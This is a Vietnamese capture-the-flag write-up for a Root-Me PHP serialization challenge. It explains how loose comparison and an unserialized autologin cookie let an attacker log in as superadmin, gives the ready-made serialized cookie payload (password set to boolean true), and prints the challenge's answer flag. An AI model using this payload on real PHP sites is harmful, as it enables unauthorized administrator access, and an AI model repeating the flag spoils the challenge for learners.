![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/481d66a5-1e5a-40d8-a5a1-7d6e135d7297)

Xem source code

![image](https://github.com/user-attachments/assets/54195e2b-7509-47b1-9490-8f46787ac6db)

![image](https://github.com/user-attachments/assets/9c192068-4c94-446a-8d9d-71ccbde85e5f)

Đọc source code này ta có thể thấy được 4 điểm chính
+ mật khẩu sẽ được mã hóa bằng sha256 => chuỗi hex
```
if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
```

+ check password đang sử dụng loose comparison . mà theo cái bảng ở README.md thì 1 chuỗi và giá trị true sẽ bằng nhau
=> ta có thể nhập cho password giá trị TRUE để bypass
```
// check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];
```

nhưng mà vấn đề đến rồi =))) mọi input ở password sẽ được hash.  vậy nên ta có điểm lưu ý số 3 là 

+ khi giá trị autologin === 1 thì hàm serialize($data) sẽ chuyển đổi biến $data thành một chuỗi dạng serialized. Trước đó, biến $data đã được khởi tạo với các giá trị như "login" và "password" 
```
if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
```
+ để bypass thì ta phải để login = superadmin

```
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
```

![image](https://github.com/user-attachments/assets/590a134d-82ab-45c1-b710-661006e47ea4)

:v đọc tài liệu có gắn link trên rootme ta thấy 1 vector có thể exploit

![image](https://github.com/user-attachments/assets/59af0b98-bd2b-4984-afec-cde2c6e2c9de)

cookie autologin có thể thay đổi nên ta sử dụng payload 
```
autologin=a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
```

nhá nhẹ b:1 = TRUE =))) còn lại thì ae tự tìm hiểu thêm nhé

![image](https://github.com/user-attachments/assets/9ca361fc-0f5b-45e6-8d96-17737360fb88)

=> NoUserInputInPHPSerialization!
